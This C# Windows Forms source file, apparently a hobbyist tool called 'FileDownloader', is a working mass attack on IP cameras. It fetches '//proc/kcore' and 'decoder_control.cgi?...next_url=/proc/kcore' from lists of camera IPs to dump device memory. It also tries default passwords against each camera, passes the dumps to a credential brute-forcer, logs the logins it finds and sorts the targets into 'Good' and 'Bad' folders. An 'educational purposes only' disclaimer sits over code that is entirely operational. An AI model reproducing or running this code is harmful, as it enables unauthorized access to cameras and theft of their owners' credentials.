﻿/*
     based joe
    ** **   *
          ** 
      *      
     *    *  
    * *      
         
        *    
       *    *
           * 
 * 
 * This code is not representative of the usual *
 * Please ignore and move on
 * All important and non-beginner code is straight from stack overflow *
 * 
 * Program is intended for educational purposes only. Feel free to use any of the code provided in anoy of your projects.
 */  

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Threading;

namespace FileDownloader
{
    using System.Collections.Concurrent;
    using System.Data.OleDb;
    using System.Windows.Forms.VisualStyles;

    using FileDownloader.Properties;

    public partial class Form1 : Form
    {
        Random random = new Random();
        List<BackgroundWorker> downloaders = new List<BackgroundWorker>();
        List<BackgroundWorker> bruteforcers = new List<BackgroundWorker>(); 
        BackgroundWorker snapshotLoader = new BackgroundWorker();
        Queue<string> bruteforceQueue = new Queue<string>();
        Queue<string[]> downloadQueue = new Queue<string[]>();
        System.Collections.Concurrent.ConcurrentDictionary<string, bool> downloadCancel = new ConcurrentDictionary<string, bool>();

        string[] oneliners = new string[] 
        {
            "Fear is the mind-killer", // dune
            "I really, really, really like this downloader", // dank banana me-mes
            "I really, really like this downloader", // dank banana me-mes
            "I really, really, really, really like this downloader", // rly dank banana me-mes
            "The sleeper must awaken", // dune
            "Praise GabeN", // life
            "Let's go bowling", // big lebowski... kinda
            "Does he look like a bitch?", // pulp fiction
            "You're gonna need a bigger boat", // jaws
            "IT'S ALIVE!", // frankenstein
            "I want to play a game", // saw
            "He who waits behind the wall", // zalgo pasta
            "i din' do nuffin",
            "yes",
            "A beginning is a very delicate time" // dune
        };

        public Form1()
        {
            this.InitializeComponent();
            
            snapshotLoader.WorkerReportsProgress = true;
            snapshotLoader.DoWork += snapshotLoader_DoWork;
            snapshotLoader.ProgressChanged += snapshotLoader_ProgressChanged;
            txtUrl.Pasted += txtUrl_Pasted;
        }


        #region Snapshots

        void snapshotLoader_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            pbPreview.Image = (Image)e.UserState;
        }

        void snapshotLoader_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                string url = stripURL(txtUrl.Text);
                string user = txtUsername.Text;
                string pass = txtPassword.Text;
                HttpWebRequest hr = (HttpWebRequest)HttpWebRequest.Create("http://" + url + "/snapshot.cgi");
                hr.Timeout = 2000;
                string credentials = GetAuthHeaders(user, pass);
                hr.Headers.Add("Authorization", "Basic " + credentials);
                hr.PreAuthenticate = true;

                using (HttpWebResponse resp = (HttpWebResponse)hr.GetResponse())
                {
                    Image snapshot = Image.FromStream(resp.GetResponseStream());
                    snapshot.Tag = @"http://" + user + @":" + pass + @"@" + url + @"/";
                    ((BackgroundWorker)sender).ReportProgress(0, snapshot);
                }
            }
            catch (WebException)
            {
                MessageBox.Show("Error loading snapshot. Ensure you have the proper credentials to access the camera.");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error loading snapshot:\r\n" + ex.Message + "\r\n" + ex.StackTrace);
            }
        }

        #endregion

        #region Downloads

        BackgroundWorker GenerateDownloader()
        {
            BackgroundWorker downloader = new BackgroundWorker()
            {
                WorkerReportsProgress = true,
                WorkerSupportsCancellation = true,
            };
            downloader.DoWork += new DoWorkEventHandler(DoWork);
            downloader.ProgressChanged += new ProgressChangedEventHandler(ProgressChanged);
            return downloader;
        }

        public void DoWork(object sender, DoWorkEventArgs e)
        {
            while (downloadQueue.Count > 0 && !((BackgroundWorker)sender).CancellationPending)
            {
                string[] downloadArgs = downloadQueue.Dequeue();
                string url = downloadArgs[0];
                string username = downloadArgs[1];
                string pass = downloadArgs[2];
                string fileName = this.GetFilenameFromIP(url);

                if (downloadCancel.ContainsKey(url))
                { // skip if user has cancelled it previously (cannot remove things from threadsafe queue, this is buggy hack)
                    bool ret = true;
                    downloadCancel.TryRemove(url, out ret);
                    continue;
                }

                // prep WebRequest with auth and url
                HttpWebRequest hr = (HttpWebRequest)HttpWebRequest.Create(url);
                if (username.Length > 0)
                {
                    string credentials = GetAuthHeaders(username, pass);
                    hr.Headers.Add("Authorization", "Basic " + credentials);
                }

                int totalRead = 0;
                FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write, FileShare.Write);
                DownloadState ds = new DownloadState() { url = url, totalRead = 0, status = "connecting..." };

                if (Settings.Default.generalAttemptDefault)
                { // login to server with all default creds
                    try
                    {
                        string[] creds = Settings.Default.generalDefaultPasswords.Split("\n".ToCharArray());
                        string ip = stripURL(url);
                        for (int i = 0; i < creds.Length; i++)
                        {
                            ds.status = String.Format("testing default [{0}/{1}]...", i + 1, creds.Length);
                            ((BackgroundWorker)sender).ReportProgress(totalRead, ds);

                            string cred = creds[i].Replace("\r", "");
                            try
                            {
                                string[] splitCred = cred.Split(':');
                                string user = splitCred[0];
                                string password = splitCred[1];

                                HttpStatusCode respCode = BruteForce.Login(ip, user, password);

                                if (respCode == HttpStatusCode.OK)
                                { // default found, log & show
                                    BruteForce.Log(ip, user, password);
                                    ds.status = "default found: \"" + cred + "\"";
                                    ds.done = true;
                                    ((BackgroundWorker)sender).ReportProgress(0, ds);
                                    break;
                                }
                                else if (respCode == HttpStatusCode.RequestTimeout)
                                {
                                    // don't loop through all the users if the server is not up
                                    break;
                                }

                            }
                            catch (Exception)
                            {
                                // bye
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // buh-bye again
                    }
                }

                if (ds.done)
                {
                    // default was found in the last loop, move onto next item in queue
                    // (this is here because break only breaks out of one loop, we do not want to break out of top while loop)
                    continue;
                }

                ds.status = "connecting...";
                ((BackgroundWorker)sender).ReportProgress(totalRead, ds);

                try
                {
                    using (HttpWebResponse resp = (HttpWebResponse)hr.GetResponse())
                    {
                        using (Stream stream = resp.GetResponseStream())
                        {
                            try
                            {
                                stream.ReadTimeout = 10000;
                                int i = 0;
                                byte[] buffer = new byte[0x25000];
                                int len;
                                while ((len = stream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    fs.Write(buffer, 0, len);
                                    totalRead += len / 1000;
                                    i++;
                                    if (i == 500)
                                    {
                                        fs.Flush(true);
                                        i = 0;
                                    }

                                    if (downloadCancel.ContainsKey(ds.url))
                                    {
                                        bool ret = true;
                                        downloadCancel.TryRemove(ds.url, out ret);
                                        ds.done = true;
                                        ds.cancelled = true;
                                        break;
                                    }

                                    if (Settings.Default.downloadAutoCancel)
                                    {
                                        if (totalRead >= 4500)
                                        {
                                            ds.done = true;
                                            break;
                                        }
                                    }

                                    ds.totalRead = totalRead;
                                    ds.status = "downloading... " + totalRead + "kb";
                                    ((BackgroundWorker)sender).ReportProgress(totalRead, ds);
                                }
                            }
                            catch (Exception)
                            {
                                // stream died (most likely)
                            }
                        }
                    }
                }
                catch (WebException ex)
                {
                    // could not reach address or fw patched
                    if (ex.Message.Contains("400"))
                    {
                        ds.status = "patched";
                    }
                    else
                    {
                        ds.status = "could not reach address";
                    }
                    ds.done = true;
                    ds.totalRead = -1;
                    ((BackgroundWorker)sender).ReportProgress(-1, ds);
                }
                catch (Exception)
                {
                    ds.status = "unknown error";
                    ds.done = true;
                    ds.totalRead = -1;
                    ((BackgroundWorker)sender).ReportProgress(-1, ds);
                }
                finally
                {
                    fs.Flush(true);
                    fs.Close();
                }
                if (!ds.cancelled && ds.totalRead > 0)
                {
                    ds.status = "done! " + totalRead + "kb";
                    ds.done = true;
                    ((BackgroundWorker)sender).ReportProgress(totalRead, ds);
                }

            }
        }

        public void ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            DownloadState ds = (DownloadState)e.UserState;
            int row = lstDownloads.Items.IndexOfKey(ds.url);

            try
            {
                lstDownloads.Items[row].SubItems[1].Text = ds.status;
                if (ds.done)
                {
                    if (Settings.Default.bruteforceAuto && ds.totalRead > 0)
                    {
                        if (Settings.Default.downloadAutoRemove)
                        {
                            lstDownloads.Items.RemoveByKey(ds.url);
                        }
                        if (Settings.Default.bruteforceStrict
                            && ds.totalRead <= Settings.Default.bruteforceOffset / 1000)
                        {
                            // file size < brute force offset, will find nothing

                            if (Settings.Default.generalSortFiles)
                            {
                                // file is bad, sort
                                this.CreateDownloadDirectoriesIfTheyDoNotExist();
                                string newFile = Environment.CurrentDirectory + "/Downloads/Bad/" + this.GetFilenameFromIP(ds.url, false);
                                if (File.Exists(newFile))
                                {
                                    File.Delete(newFile);
                                    System.Threading.Thread.Sleep(200);
                                }
                                File.Move(this.GetFilenameFromIP(ds.url), newFile);
                            }

                            if (ds.totalRead > 0)
                            {
                                txtBruteforceLog.InvokeIfRequired(
                                    () =>
                                        {
                                            txtBruteforceLog.AppendText(
                                                ds.url
                                                + " -> skipped - nothing found. Try disabling \"Strict\" mode\r\n");
                                        });
                            }



                            return;
                        }

                        // download finished
                        AddToBruteForceQueue(ds.url);
                    }
                    else if (ds.totalRead <= 0)
                    {
                        string filename = this.GetFilenameFromIP(ds.url);
                        if (File.Exists(filename))
                        {
                            File.Delete(filename);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message + "\r\n" + ex.StackTrace);
            }
        }

        #endregion

        #region KCore/Bruteforce
        BackgroundWorker GenerateBruteforcer()
        {
            BackgroundWorker bruteforcer = new BackgroundWorker();
            bruteforcer.WorkerReportsProgress = true;
            bruteforcer.DoWork += bruteforcer_DoWork;
            bruteforcer.ProgressChanged += bruteforcer_ProgressChanged;
            return bruteforcer;
        }

        void bruteforcer_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            object[] retValue = (object[])e.UserState;
            txtBruteforceLog.InvokeIfRequired(
                () =>
                    {
                        txtBruteforceLog.AppendText(retValue[0].ToString());
                    });
            if (retValue[2] != null)
            {
                // find the list item and add the bruteforceevent as a tag
                lstDownloads.InvokeIfRequired(
                    () =>
                        {
                            ListViewItem lvi = null;
                            string firstColumn = retValue[1].ToString();

                            foreach (ListViewItem lvix in lstDownloads.Items)
                            {
                                if (lvix.Text == firstColumn)
                                {
                                    lvi = lvix;
                                    break;
                                }
                            }

                            if (lvi != null)
                            {
                                lvi.Tag = retValue[2];
                            }
                        });

                if (Settings.Default.generalSortFiles)
                {
                    BruteForceEvent be = (BruteForceEvent)retValue[2];
                    if (be.retry)
                    {
                        // don't move the file because it will be bruteforced again shortly
                        return;
                    }

                    this.CreateDownloadDirectoriesIfTheyDoNotExist();

                    string filename = be.filename;
                    string[] splitFilename = be.filename.Split('/');
                    string filenameLocal = splitFilename[splitFilename.Length - 1];
                    string newDir = "Downloads/Unknown/";

                    if (be.foundUser.Length > 0)
                    {
                        newDir = "Downloads/Good/";
                    }
                    else if (be.error != null && be.error.Length > 0)
                    {
                        newDir = "Downloads/Possible/";
                    }

                    string finalName = newDir + filenameLocal;
                    if (File.Exists(finalName))
                    {
                        File.Delete(finalName);
                        System.Threading.Thread.Sleep(200);
                    }

                    File.Move(filename, finalName);
                }
            }
        }

        void bruteforcer_DoWork(object sender, DoWorkEventArgs e)
        {
            while (bruteforceQueue.Count > 0 && !((BackgroundWorker)sender).CancellationPending)
            {
                string ip = bruteforceQueue.Dequeue();
                object[] retValue = new object[] { "Bruteforcing " + stripURL(ip) + "...\r\n", ip, null };

                //((BackgroundWorker)sender).ReportProgress(0, retValue);
                BruteForceEvent be = BruteForce.Auto(stripURL(ip), GetFilenameFromIP(ip), Settings.Default.bruteforceStrict ? 2 : 1, false);
                string output;

                if(be.error != null && be.error.Length > 0)
                {
                    output = be.error;
                }
                else
                {
                    output = be.foundUser + ":" + be.foundPass;
                    retValue[2] = be;
                }

                retValue[0] = stripURL(ip) + " -> " + output + "\r\n---\r\n";
               
                ((BackgroundWorker)sender).ReportProgress(0, retValue);

                if (be.retry)
                {
                    this.AddToBruteForceQueue(ip);
                }
            }
        }

        private void AddToBruteForceQueue(string ip)
        {
            bruteforceQueue.Enqueue(ip);

            foreach (BackgroundWorker b in bruteforcers)
            {
                if (!b.IsBusy)
                {
                    b.RunWorkerAsync();
                    return;
                }
            }

            if (bruteforcers.Count < Settings.Default.bruteforceConcurrent)
            {
                BackgroundWorker bruteforce = this.GenerateBruteforcer();
                bruteforcers.Add(bruteforce);
                bruteforce.RunWorkerAsync();
            }
        }

        #endregion

        #region Form Listeners

        #region ToolStripMenuItem
        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstDownloads.SelectedItems.Count > 0)
            {
                string filename = GetFilenameFromIP(lstDownloads.SelectedItems[0].Text);
                Process.Start(filename);
            }
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to cancel " + lstDownloads.SelectedItems.Count + " downloads?", "Confirm Cancellation", MessageBoxButtons.YesNoCancel) == System.Windows.Forms.DialogResult.Yes)
            {
                foreach (ListViewItem lvi in lstDownloads.SelectedItems)
                {
                    downloadCancel.GetOrAdd(lvi.Text, false);
                    lvi.SubItems[1].Text = "cancelled";
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to delete " + lstDownloads.SelectedItems.Count + " downloads?", "Confirm Deletion", MessageBoxButtons.YesNoCancel) == System.Windows.Forms.DialogResult.Yes)
            {
                List<ListViewItem> lvis = new List<ListViewItem>();
                List<BackgroundWorker> bgs = new List<BackgroundWorker>();
                foreach (ListViewItem lvi in lstDownloads.SelectedItems)
                {
                    int index = lstDownloads.Items.IndexOf(lvi);

                    downloadCancel.GetOrAdd(lvi.Text, false);
                    lvis.Add(lvi);
                }
                foreach (ListViewItem lvi in lvis)
                {
                    lstDownloads.Items.Remove(lvi);
                }
            }
        }

        private void bruteforceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstDownloads.SelectedItems)
            {
                AddToBruteForceQueue(lvi.Text);
            }
        }
        #endregion

        #region Menu Strip

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void listToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] lines = File.ReadAllLines(ofd.FileName);
                foreach (string line in lines)
                {
                    this.QueueDownload("http://" + stripURL(line) + "//proc/kcore", "", "", true);
                }

                foreach (ColumnHeader ch in lstDownloads.Columns)
                {
                    ch.Width = -2;
                }

                foreach (BackgroundWorker downloader in downloaders)
                {
                    if (!downloader.IsBusy)
                    {
                        downloader.RunWorkerAsync();
                    }
                }

                while (downloaders.Count < Settings.Default.downloadConcurrent)
                {
                    BackgroundWorker downloader = this.GenerateDownloader();
                    downloaders.Add(downloader);
                    downloader.RunWorkerAsync();
                }

            }
        }

        /*private void dumpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void exportToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }*/

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //FormSettings fs = new FormSettings();
            FormSettingsNew fs = new FormSettingsNew();
            fs.ShowDialog();
        }
        private void helpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("How to Use:\r\n1. Get the camera's IP and put it in the top text box\r\n2. Press Download\r\n 3. Wait.");
        }

        #endregion
        private void txtUrl_Enter(object sender, EventArgs e)
        { 
            // http://stackoverflow.com/a/6857301/3649573
            // sexiest answer, don't even know how it works so beautifully
            BeginInvoke((Action)delegate
            {
                txtUrl.SelectAll();
            });
        }

        private void pbPreview_Click(object sender, EventArgs e)
        {
            if (pbPreview.Image != null && pbPreview.Image.Tag != null)
            {
                Process.Start(pbPreview.Image.Tag.ToString());
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.QueueDownload(txtUrl.Text, txtUsername.Text, txtPassword.Text);
        }

        private void QueueDownload(string url, string user, string pass, bool silent = false)
        {
            string[] args = new string[] { url, user, pass };
            try
            {
                foreach (string[] s in downloadQueue)
                {
                    if (s[0] == url)
                    {
                        if (!silent)
                        {
                            MessageBox.Show(url + " is already in the queue waiting to be downloaded!");
                        }
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }


            if (lstDownloads.Items.ContainsKey(url))
            {
                int index = lstDownloads.Items.IndexOfKey(url);
                string text = lstDownloads.Items[index].SubItems[1].Text;
                if (text.Contains("downloading"))
                {
                    // download in progress
                    if (!silent)
                    {
                        MessageBox.Show(url + " is currently downloading!");
                    }
                    return;
                }
                lstDownloads.Items[index].SubItems[1].Text = "download queued";
            }
            else
            {
                ListViewItem lvi = new ListViewItem(url);
                lvi.Name = url;
                lvi.SubItems.Add(new ListViewItem.ListViewSubItem(lvi, "download queued"));
                lstDownloads.Items.Add(lvi);
                if (!silent)
                {
                    foreach (ColumnHeader ch in lstDownloads.Columns)
                    {
                        ch.Width = -2;
                    }
                }
            }
            

            downloadQueue.Enqueue(args);

            if (!silent)
            {
                foreach (BackgroundWorker downloader in downloaders)
                {
                    if (!downloader.IsBusy)
                    {
                        downloader.RunWorkerAsync();
                        return;
                    }
                }

                if (downloaders.Count < Settings.Default.downloadConcurrent)
                {
                    BackgroundWorker downloader = this.GenerateDownloader();
                    downloaders.Add(downloader);
                    downloader.RunWorkerAsync();
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label4.ForeColor = Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255));
        }

        private void label4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Shitty FileDownloader by Based Joe\r\nFor Education Purposes Only");
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            if(snapshotLoader.IsBusy)
            {
                MessageBox.Show("Snapshot Loader is currently busy with another snapshot");
            }
            else
            {
                snapshotLoader.RunWorkerAsync();
            }

        }

        private void rbKCore_CheckedChanged(object sender, EventArgs e)
        {
            ChangeTextboxKCore();
        }

        private void rbDecoder_CheckedChanged(object sender, EventArgs e)
        {
            ChangeTextboxDecoder();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            int selection = random.Next(0, oneliners.Length - 1);
            this.Text = "FileDownloader: " + oneliners[selection];
        }

        void txtUrl_Pasted(object sender, ClipboardEventArgs e)
        {
            this.FormatURL(e.ClipboardText);
            
        }

        private void lstDownloads_DoubleClick(object sender, EventArgs e)
        {
            if(lstDownloads.SelectedItems.Count > 0)
            {
                if (lstDownloads.SelectedItems[0].Tag != null)
                {
                    BruteForceEvent be = ((BruteForceEvent)lstDownloads.SelectedItems[0].Tag);
                    this.FormatURL(be.ip);
                    if (be.foundUser != null && be.foundUser.Length > 0)
                    {
                        txtUsername.Text = be.foundUser;
                        txtPassword.Text = be.foundPass;
                    }
                }
                else
                {
                    string ip = lstDownloads.SelectedItems[0].Text;
                    this.FormatURL(ip);
                }
            }
        }

        #endregion

        #region Misc Functions

        private void CreateDownloadDirectoriesIfTheyDoNotExist()
        {
            string downloadDir = Environment.CurrentDirectory + "\\Downloads\\";
            if (!Directory.Exists(downloadDir))
            {
                Directory.CreateDirectory(downloadDir);
                System.Threading.Thread.Sleep(200);
            }

            foreach (string dir in new String[] { "Good", "Possible", "Unknown", "Bad" })
            {
                string fullDir = downloadDir + dir;
                if (!Directory.Exists(fullDir))
                {
                    Directory.CreateDirectory(fullDir);
                    System.Threading.Thread.Sleep(200);
                }
            }
        }

        private string GetFilenameFromIP(string ip, bool full = true)
        {
            if (!Directory.Exists("Downloads"))
            {
                Directory.CreateDirectory("Downloads");
            }
            string filename = ip.Replace(':', '-').Replace('/', ' ').Replace('?', '=').Replace('&', ',') + ".joe";
            if (full)
            {
                filename = Environment.CurrentDirectory + "/Downloads/" + filename;
            }
            return filename;
        }

        private void FormatURL(string text = "")
        {
            if (text == "")
            {
                text = txtUrl.Text;
            }

            if (rbKCore.Checked)
            {
                ChangeTextboxKCore(text);
            }
            else
            {
                ChangeTextboxDecoder(text);
            }
        }

        private void ChangeTextboxKCore(string preset = "")
        {
            string url = preset.Length > 0 ? preset : txtUrl.Text;
            string kcoreUrl = "http://" + stripURL(url) + "//proc/kcore";
            txtUrl.Text = kcoreUrl;
        }

        private void ChangeTextboxDecoder(string preset = "")
        {
            string url = preset.Length > 0 ? preset : txtUrl.Text;
            string decoderUrl = "http://" + stripURL(url) + "/decoder_control.cgi?command=1&next_url=/proc/kcore";
            txtUrl.Text = decoderUrl;
        }

        public static string stripURL(string URL)
        {
            string strippedURL = URL.Replace("http://", "").Replace("//proc/kcore", "").Replace("/decoder_control.cgi?command=1&next_url=/proc/kcore", "").Trim();
            return strippedURL.Split('/')[0];
        }

        private string GetAuthHeaders(string username, string password, bool full = false)
        {
            string base64 = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(username + ":" + password));
            if (full)
            {
                return "Authorization: Basic " + base64 + System.Environment.NewLine;
            }
            return base64;
        }
        #endregion
    }
}
